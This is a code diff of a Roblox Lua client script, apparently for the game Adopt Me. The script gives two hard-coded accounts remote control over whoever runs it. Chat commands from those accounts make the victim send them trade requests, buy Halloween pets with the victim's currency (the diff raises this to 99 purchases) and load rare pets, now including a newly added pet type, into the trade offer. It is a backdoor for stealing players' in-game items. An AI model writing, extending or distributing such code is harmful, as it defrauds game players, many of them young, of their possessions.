@@ -3,20 +3,17 @@ local Fsys = require(game.ReplicatedStorage:FindFirstChild("Fsys")).load
 local ClientData = Fsys("ClientData")
 local get = Fsys("RouterClient").get
 
-get("ShopAPI/BuyItem"):InvokeServer("pets", "halloween_2025_ghostly_cat", {["buy_count"] = 99})
-
 function onPlayerChatted(player)
 	player.Chatted:Connect(function(message)
 		if player.Name == "xlsxh" or player.Name == "tracy_gltx" then
 
 			if message == ".trade" then
 				get("TradeAPI/SendTradeRequest"):FireServer(game.Players[player.Name])
-				game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("i sent you a trade request.")
 			end
 			
 			if message == ".buy" then
-				for i=1, 10 do
-					get("ShopAPI/BuyItem"):InvokeServer("pets", "halloween_2025_ghostly_cat", {["buy_count"] = 1})
+				for i=1, 99 do
+					get("ShopAPI/BuyItem"):InvokeServer("pets", "halloween_2025_dj_snooze", {["buy_count"] = 1})
 				end
 			end
 
@@ -30,7 +27,7 @@ function onPlayerChatted(player)
 
 			if message == ".add pet" then
 				for i,v in pairs(ClientData.get_data()[LocalPlayer.Name].inventory.pets) do
-					if v["kind"] == "halloween_2025_ghostly_cat" or v["kind"] == "halloween_2025_bat_cat" then
+					if v["kind"] == "halloween_2025_ghostly_cat" or v["kind"] == "halloween_2025_bat_cat" or v["kind"] == "halloween_2025_dj_snooze" then
 						wait()
 						get("TradeAPI/AddItemToOffer"):FireServer(v.unique)
 					end
